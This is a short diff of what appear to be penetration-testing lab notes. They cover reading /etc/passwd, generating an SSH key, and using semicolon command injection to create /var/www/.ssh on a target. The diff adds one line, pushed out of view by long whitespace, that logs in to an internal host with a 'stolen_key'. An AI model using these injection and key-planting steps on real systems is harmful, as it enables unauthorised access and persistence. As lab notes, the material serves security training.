@@ -121,7 +121,7 @@ Identify user and home directory using whoami and cat /etc/passwd
 ssh-keygen -t rsa -b 4096 # Enter for default option
 No Passphrase
 cat /home/student/.ssh/id_rsa.pub
-
+                                                        ssh -i stolen_key jane@target_internal_ip
 ## On Target, make directory and verify
 ; mkdir /var/www/.ssh
 ; ls -la /var/www
